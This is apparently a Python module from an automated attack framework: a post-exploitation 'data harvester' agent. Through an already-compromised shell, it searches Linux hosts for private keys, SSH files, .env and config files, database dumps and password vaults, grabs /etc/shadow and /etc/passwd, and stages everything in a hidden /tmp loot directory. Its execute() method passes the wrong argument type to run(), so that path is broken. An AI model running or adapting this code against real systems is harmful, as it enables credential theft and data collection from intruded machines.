import asyncio
from core.data_models import AgentData, Strategy
from core.logger import log
from core.data_models import Strategy, DataHarvesterReport, AttackPhase, ErrorType
from core.target_model_manager import TargetModel
from typing import Optional
from core.shell_manager import ShellManager
from core.target_model_manager import TargetModelManager
import time

from core.base_agent import BaseAgent


class DataHarvesterAgent(BaseAgent):
    # Assuming AttackPhase enum is not available
    supported_phases = ["POST_EXPLOITATION"]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.linux_patterns = [
            "*.pem", "*.key", "id_rsa", "known_hosts", "*config*.json",
            ".env", "*.sql", "*.bak", "*dump*", "*.p12", "*.kdbx"
        ]
        self.linux_files = ["/etc/shadow", "/etc/passwd"]
        self.linux_search_dirs = ["/home", "/etc", "/var/www", "/opt"]
        self.report_class = DataHarvesterReport # Set report class

    async def setup(self):
        """Asynchronous setup method for DataHarvesterAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')

    async def run(self, strategy: Strategy, **kwargs) -> DataHarvesterReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return DataHarvesterReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id="",
                errors=["Shell ID not provided."],
                error_type=ErrorType.CONFIGURATION,
                summary="Data harvesting failed: Missing shell ID."
            )

        log.phase(
            f"DataHarvesterAgent: Searching for valuable data on shell {shell_id}")

        # Simple OS check
        os_output = await self.shell_manager.send_command(shell_id, "uname -o", timeout=10)
        if "GNU/Linux" not in os_output:
            end_time = time.time()
            return DataHarvesterReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=[f"Unsupported OS for data harvesting: {os_output}"],
                error_type=ErrorType.CONFIGURATION,
                summary=f"Data harvesting failed: Unsupported OS {os_output}."
            )

        staging_dir = "/tmp/.dlnk_loot"
        await self.shell_manager.send_command(shell_id, f"mkdir -p {staging_dir}")
        log.info(f"Created staging directory: {staging_dir}")

        # Build the find command
        find_patterns = " -o ".join(
            [f"-name '{p}'" for p in self.linux_patterns])
        search_dirs_str = " ".join(self.linux_search_dirs)
        find_command = f"find {search_dirs_str} -type f \\( {find_patterns} \\) 2>/dev/null"

        log.info(f"Executing search command: {find_command}")
        found_files_output = await self.shell_manager.send_command(shell_id, find_command, timeout=300)

        found_files = found_files_output.splitlines()
        # Also try to grab default sensitive files
        found_files.extend(self.linux_files)
        staged_files = []

        if not found_files:
            end_time = time.time()
            return DataHarvesterReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                summary="No valuable files found.",
                staging_directory=staging_dir
            )

        log.info(f"Found {len(found_files)} potential files. Staging them...")

        copy_tasks = []
        for file_path in found_files:
            if not file_path.strip():
                continue
            # Sanitize filename for the destination path
            dest_filename = file_path.replace("/", "_").strip("_")
            copy_command = f"cp {file_path} {staging_dir}/{dest_filename}"
            copy_tasks.append(self.shell_manager.send_command(
                shell_id, copy_command, timeout=60))

        results = await asyncio.gather(*copy_tasks, return_exceptions=True)

        for file_path, result in zip(found_files, results):
            if not isinstance(result, Exception):
                staged_files.append(file_path)
            else:
                log.warning(f"Failed to stage file {file_path}: {result}")

        if not staged_files:
            end_time = time.time()
            return DataHarvesterReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["Found files but failed to stage any."],
                error_type=ErrorType.LOGIC,
                summary="Data harvesting failed: Found files but failed to stage any.",
                staging_directory=staging_dir
            )

        # Update the target model to reflect that harvesting is complete
        target_model = self.target_model_manager.get_target(
            strategy.context.get("hostname"))
        if target_model:
            target_model.data_harvested = True
            self.target_model_manager.save_model(target_model)

        summary = f"Successfully staged {len(staged_files)} files in {staging_dir}."
        log.success(summary)
        end_time = time.time()
        return DataHarvesterReport(
            agent_name=self.__class__.__name__,
            start_time=start_time,
            end_time=end_time,
            shell_id=shell_id,
            collected_files=staged_files,
            staging_directory=staging_dir,
            summary=summary
        )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute data harvester agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
